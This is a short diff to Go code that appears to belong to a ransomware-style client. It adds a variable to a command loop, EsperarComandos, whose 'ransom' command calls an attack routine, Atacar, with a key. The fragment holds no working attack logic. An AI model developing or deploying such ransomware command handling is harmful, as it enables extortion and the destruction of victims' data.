@@ -35,6 +35,8 @@ func EsperarComandos(con net.Conn, re *bufio.Reader, host string, key string) {
 		}
 
 		var salida []byte
+		var salidaVerbosa []byte
+		
 		switch strings.TrimSpace(cp) {
 		case "ransom":
 			salidaVerbosa = []byte(Atacar(key)) //no lo imprimo para no saturar pero es interesante poder verlo
